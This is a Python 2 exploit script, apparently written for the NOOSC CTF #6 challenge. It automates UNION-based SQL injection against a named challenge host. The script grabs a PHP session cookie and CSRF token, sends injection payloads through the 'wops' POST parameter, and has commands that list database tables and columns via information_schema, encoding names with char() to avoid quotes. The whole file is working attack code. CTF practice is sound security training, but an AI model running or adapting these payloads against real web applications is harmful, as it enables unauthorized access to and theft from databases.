#!/usr/bin/env python
# By Indra BW

import cmd
import requests

class Noosc6(cmd.Cmd):
    """ Command prompt """

    intro = """NOOSC CTF #6 SQL Injection
Gunakan perintah wops untuk inject
Ketik 'help' atau '?' untuk perintah lain.
Ctl+d, exit, quit untuk keluar."""
    prompt = '[noosc6] > '
    pre_inject = '1 union all select 1, 2, 3, '

    def do_wops(self, inject_cmd):
        """wops inject_cmd
        Inject parameter wops. ?wops=inject_cmd"""
        if inject_cmd:
            inject_request = Noosc6Requests(inject_cmd)
            print inject_request.response()
        else:
            print "inject_cmd diperlukan"

    def do_tables(self, line):
        """tables
        List nama tables di database"""
        inject_cmd = self.pre_inject + 'group_concat(table_name) from information_schema.tables where table_schema=database()'
        inject_request = Noosc6Requests(inject_cmd)
        print "Tables di database:"
        print inject_request.response()

    def do_cols(self, nama_table):
        """cols nama_table
        List nama column di table nama_table"""
        if nama_table:
            table_chr = []
            for c in nama_table:
                table_chr.append(str(ord(c)))

            inject_cmd = self.pre_inject + 'group_concat(column_name) from information_schema.columns where table_name=char(' + ', '.join(table_chr)  + ')'
            inject_request = Noosc6Requests(inject_cmd)
            print "Column di table", nama_table + ':'
            print inject_request.response()
        else:
            print "nama_table diperlukan"

    def do_EOF(self, line):
        return True

    def do_exit(self, line):
        exit()

    def do_quit(self, line):
        exit()

class Noosc6Requests:
    """ Requests http noosc #6 web """

    def __init__(self, inject_cmd):
        self.inject_cmd = inject_cmd
        self.url = "http://bx5166.ctf.noosc.co.id:8080/"
        self.url_data = self.url + 'data.php'
        self.url_data2 = self.url + 'data2.php'
        self.inject_params = 'wops'
        self.data = self.request_data()
        self.msg = self.request_data2(self.data, self.inject_cmd)

    def request_data(self):
        """Ambil data PHPSESSID, csrftoken_id, csrftoken_val untuk auth data2.php"""

        r = requests.get(self.url_data)
        try:
            self.phpsessid = r.cookies['PHPSESSID']
            print 'PHP Session ID found: ' + r.cookies['PHPSESSID']

            json_data = r.json() if requests.__version__  >= '1.0.0' else r.json
            self.csrftoken_id = json_data['csrftoken_id']
            self.csrftoken_val = json_data['csrftoken_val']
            data = {'PHPSESSID': r.cookies['PHPSESSID'], 'csrftoken_id': json_data['csrftoken_id'], 'csrftoken_val': json_data['csrftoken_val']}

            print 'csrftoken_id: ' + self.csrftoken_id
            print 'csrftoken_val: ' + self.csrftoken_val

            return data
        except:
            print 'PHP Session ID not found.'
            exit()

    def request_data2(self, data, inject_cmd):
        """SQL Injection dari data2.php"""

        cookie  = {'PHPSESSID': data['PHPSESSID']}  # set cookie PHPSESSID
        payload = {data['csrftoken_id']: data['csrftoken_val'], self.inject_params: inject_cmd}  # set token auth dan perintah inject
        headers = {'content-type': 'application/x-www-form-urlencoded'}  # content-type untuk POST method

        print "payload: " + str(payload)
        r = requests.post(self.url_data2, headers=headers, cookies=cookie, data=payload, allow_redirects=True)
        #print r.text
        json_data = r.json() if requests.__version__  >= '1.0.0' else r.json

        return json_data['msg']

    def response(self):
        return "\n*** msg: " + self.msg

if __name__ == '__main__':
    Noosc6().cmdloop()
